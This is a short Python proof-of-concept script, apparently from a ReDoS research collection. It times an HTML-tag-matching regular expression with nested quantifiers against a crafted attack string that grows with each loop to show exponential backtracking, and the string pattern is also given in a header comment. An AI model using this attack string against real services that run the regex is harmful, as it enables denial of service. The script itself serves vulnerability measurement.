# 4615
# &amp;lt;/?([a-zA-Z][-A-Za-z\d\.]{0,71})(\s+(\S+)(\s*=\s*([-\w\.]{1,1024}|&amp;quot;[^&amp;quot;]{0,1024}&amp;quot;|'[^']{0,1024}'))?)*\s*&amp;gt;
# EXPONENT
# nums:4
# EXPONENT AttackString:"&amp;lt;a &"+"\t=''"*32+"! _1_EOA(i or ii)"

import re
from time import perf_counter

regex = """&amp;lt;/?([a-zA-Z][-A-Za-z\d\.]{0,71})(\s+(\S+)(\s*=\s*([-\w\.]{1,1024}|&amp;quot;[^&amp;quot;]{0,1024}&amp;quot;|'[^']{0,1024}'))?)*\s*&amp;gt;"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "&amp;lt;a &" + "\t=\'\'" * i * 1 + "! _1_EOA(i or ii)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")